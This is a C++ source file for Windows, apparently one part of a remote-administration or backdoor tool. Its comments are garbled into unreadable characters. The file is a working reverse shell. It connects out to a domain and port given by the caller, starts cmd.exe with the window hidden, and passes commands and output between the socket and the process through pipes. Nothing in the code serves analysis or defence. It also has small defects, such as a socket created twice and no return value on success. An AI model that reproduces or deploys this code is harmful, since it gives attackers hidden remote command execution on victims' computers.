#include "pch.h"
#include "Shell.h"

#define SEND_SIZE   512
#define RESULT_SIZE 2048

static Shell gShell; // ��ʼ����
static SOCKET gSocket = SOCKET_ERROR; // ����ԭʼ�׽��� ��ΪҪʹ��һ���첽���׽���
// �ĸ�HANDLE �������������ܵ�
static HANDLE ghReadPipe1, ghWritePipe1, ghReadPipe2, ghWritePipe2;
// ���������н���֮���õ���pi ����cmd����
static PROCESS_INFORMATION gPi = { 0 };
// ׼������
// ׼������
static CHAR szSend[SEND_SIZE] = { 0 };
static CHAR szResult[RESULT_SIZE] = { 0 };

void Shell::startShell(std::string domain, int port) {
	// ���ò����Ӻ÷������׽���
	if (!setAsySocket(domain, port)) {
		OutputDebugStringA("set asy socket failed\r\n");
	}

	// �����ӽ���
	// ��ʱsocket����׼����
	if (!createCmd()) {
		OutputDebugStringA("create cmd exe failed\r\n");
		closesocket(gSocket);
		gSocket = SOCKET_ERROR;
		return;
	}
	// ������ͨcmd��socket���̺߳���
	HANDLE h = CreateThread(NULL, 0, Shell::threadProc, (LPVOID)NULL, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
		closesocket(gSocket);
		gSocket = SOCKET_ERROR;
		return;
	}
	OutputDebugStringA("start shell successfully\r\n");
}

// ����cmd�ӽ���
bool Shell::createCmd() {
	// ���������ܵ�
	SECURITY_ATTRIBUTES securityAttributes = { 0 };
	securityAttributes.bInheritHandle = TRUE;
	securityAttributes.nLength = sizeof(securityAttributes);
	securityAttributes.lpSecurityDescriptor = NULL;
	if ((!::CreatePipe(&ghReadPipe1, &ghWritePipe1, &securityAttributes, 0)) |
		(!::CreatePipe(&ghReadPipe2, &ghWritePipe2, &securityAttributes, 0))) {
		OutputDebugStringA("create pipe failed\r\n");
		return false;
	}

	// ��Ϊ����ʹ�� ����Ҫ����׼��
	RtlZeroMemory(&gPi, sizeof(PROCESS_INFORMATION));
	// ����cmd����
	STARTUPINFOA si = { 0 };
	// ���ش���
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	// ���ñ�׼��������ʹ��󵽹ܵ�
	si.hStdInput = ghReadPipe2;
	si.hStdOutput = si.hStdError = ghWritePipe1;
	// ƴ�����������е�����
	CHAR szCmdLine[256] = { 0 };
	GetSystemDirectoryA(szCmdLine, sizeof(szCmdLine));
	StringCchCatA(szCmdLine, _countof(szCmdLine), "\\cmd.exe");
	if (CreateProcessA(szCmdLine, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &gPi) == 0)
	{
		CloseHandle(ghReadPipe1);
		CloseHandle(ghReadPipe2);
		CloseHandle(ghWritePipe1);
		CloseHandle(ghWritePipe2);
		return false;
	}

	return true;
}

// �̺߳��� ����ͨ�ܵ���socket
DWORD Shell::threadProc(LPVOID args) {
	// ���ݴ���ѭ��
	while (true)
	{
		// -------------------------------���չܵ����ݲ��֣�������ԣ�----------------------------
		DWORD dwBytesResult = 0;
		RtlZeroMemory(szResult, sizeof(szResult));
		// �ȿ���û������ ��ֹû�����ݻ�ȥ���������
		if (PeekNamedPipe(ghReadPipe1, szResult, sizeof(szResult), &dwBytesResult, NULL, NULL)) {
			// �����ݾͶ�
			if (dwBytesResult) {
				RtlZeroMemory(szResult, sizeof(szResult));
				if (!ReadFile(ghReadPipe1, szResult, sizeof(szResult), &dwBytesResult, NULL)) {
					OutputDebugStringA("cannot read pipe\r\n");
					break;
				}

				// �����˾ͷ���hunter
				while (true) {
					// ��������Ҫ�����ڶ��׽��� ����ķ�����д�ǲ�����
					int ret = send(gSocket, szResult, lstrlenA(szResult), 0);
					if (ret == SOCKET_ERROR)
					{
						int r = WSAGetLastError();
						// ��������д
						if (r == WSAEWOULDBLOCK)
						{
							// ����д��˵��һ��Ҫд��(ǰ������Ϊ��������д�����)
							continue;
						}
						else
						{
							OutputDebugStringA("cannot write socket and stop shell\r\n");
							// �����������
							CloseHandle(ghReadPipe1);
							CloseHandle(ghReadPipe2);
							CloseHandle(ghWritePipe1);
							CloseHandle(ghWritePipe2);
							TerminateProcess(gPi.hProcess, 0); // һ��Ҫ�ر��ӽ��̰�����������
							CloseHandle(gPi.hProcess);
							closesocket(gSocket);
							gSocket = SOCKET_ERROR;
							return 1;
						}
					}
					else
					{
						// д��ͼ���
						break;
					}
				}
			}
		}

		// -------------------------------�����׽������ݲ��֣��������룩----------------------------

		// ��������
		RtlZeroMemory(szSend, sizeof(szSend));
		int ret = recv(gSocket, szSend, sizeof(szSend), 0);
		if (ret == SOCKET_ERROR)
		{
			int r = WSAGetLastError();
			if (r == WSAEWOULDBLOCK)
			{
				continue;
			}
			else
			{
				OutputDebugStringA("cannot read socket and stop shell\r\n");
				break;
			}
		}
		// ����ܵ�
		// ������������дҪ�����ַ�����������
		DWORD dwBytesWrite = 0;
		if (!WriteFile(ghWritePipe2, szSend, lstrlenA(szSend), &dwBytesWrite, NULL)) {
			OutputDebugStringA("cannot write pipe\r\n");
			break;
		}
	}

	// һ����������ʹ������
	CloseHandle(ghReadPipe1);
	CloseHandle(ghReadPipe2);
	CloseHandle(ghWritePipe1);
	CloseHandle(ghWritePipe2);
	closesocket(gSocket);
	gSocket = SOCKET_ERROR;
	return 1;
}

// ���÷������׽���
bool Shell::setAsySocket(std::string domain, int port) {
	unsigned long ul = 1;
	int ret;
	gSocket = socket(AF_INET, SOCK_STREAM, 0);
	// ����Ϊ�������׽���
	if (SOCKET_ERROR == ioctlsocket(gSocket, FIONBIO, (unsigned long*)&ul)) {
		OutputDebugStringA("set asy socket failed\r\n");
		return false;
	}
	// ���ӹ���
	std::string ip = TcpSocket::fromDomainToIP(domain);

	// �����׽��� 0��ʾ�Ȳ�ָ��Э��
	if ((int)(gSocket = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR) {
		OutputDebugStringA("Failed to create socket ");
		OutputDebugStringA(ip.data());
		OutputDebugStringA("\r\n");

		closesocket(gSocket);
		gSocket = SOCKET_ERROR;
		return false;
	}
	struct sockaddr_in addr;
	// ���õ�ַ�Ͷ˿�
	addr.sin_family = AF_INET;
	addr.sin_addr.S_un.S_addr = inet_addr(ip.data());
	addr.sin_port = htons(port);

	// ����
	if (connect(gSocket, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
		OutputDebugStringA("Failed to connect to ");
		OutputDebugStringA(ip.data());
		OutputDebugStringA("\r\n");

		closesocket(gSocket);
		gSocket = SOCKET_ERROR;
		return false;
	}
}

